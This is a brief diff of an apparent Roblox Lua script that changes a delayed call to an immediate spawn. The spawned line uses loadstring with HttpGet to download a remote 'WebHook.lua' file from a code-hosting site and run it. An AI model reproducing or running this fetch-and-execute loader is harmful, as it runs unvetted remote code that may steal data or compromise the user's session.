@@ -3,7 +3,7 @@
     Discord: xingtaiduan
 ]]
 
-task.delay(5, function()
+task.spawn(function()
     loadstring(game:HttpGet("https://raw.gitcode.com/XiaoYunUwU/XA/raw/main/WebHook.lua"))("分支")
 end)
 
